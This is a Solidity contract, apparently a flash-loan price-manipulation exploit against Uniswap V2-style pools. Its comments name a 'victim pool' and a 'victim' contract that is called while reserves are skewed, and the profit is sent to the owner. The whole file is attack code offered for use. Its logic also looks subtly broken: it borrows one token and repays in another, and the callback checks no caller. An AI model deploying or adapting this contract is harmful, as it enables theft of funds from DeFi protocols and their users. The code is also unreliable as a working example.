// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IV2Pair {
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32 ts);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IERC20Lite {
    function balanceOf(address) external view returns (uint);
    function transfer(address, uint) external returns (bool);
}

contract FlashManipulator {
    // simple flash-loan callback for V2 pairs
    address owner;

    constructor() { owner = msg.sender; }

    function exploit(
        address pair,      // victim pool
        address tokenA,    // token we dump
        address tokenB,    // token we pull
        uint    amountA,   // how much to dump
        address victim,    // contract that reads getReserves()
        bytes   calldata victimCall  // calldata to trigger victim
    ) external {
        require(msg.sender == owner, "!owner");
        // flash-loan tokenA from the same pair
        IV2Pair(pair).swap(0, amountA, address(this), abi.encode(pair, tokenA, tokenB, victim, victimCall));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        (address pair, address tokenA, address tokenB, address victim, bytes memory victimCall) =
            abi.decode(data, (address, address, address, address, bytes));
        uint amount = amount0 > 0 ? amount0 : amount1;
        // push price: dump tokenA into pool
        IERC20Lite(tokenA).transfer(pair, amount * 3); // skew reserves
        // call victim at fake price
        (bool succ,) = victim.call(victimCall);
        require(succ, "victim call failed");
        // pull profit (tokenB) back
        uint payBack = amount + (amount * 3) / 1000 + 1; // 0.3 % fee + 1 wei
        uint bal = IERC20Lite(tokenB).balanceOf(address(this));
        require(bal >= payBack, "not enough profit");
        IERC20Lite(tokenB).transfer(pair, payBack);
        // leave rest to owner
        if (IERC20Lite(tokenB).balanceOf(address(this)) > 0)
            IERC20Lite(tokenB).transfer(owner, IERC20Lite(tokenB).balanceOf(address(this)));
    }
}
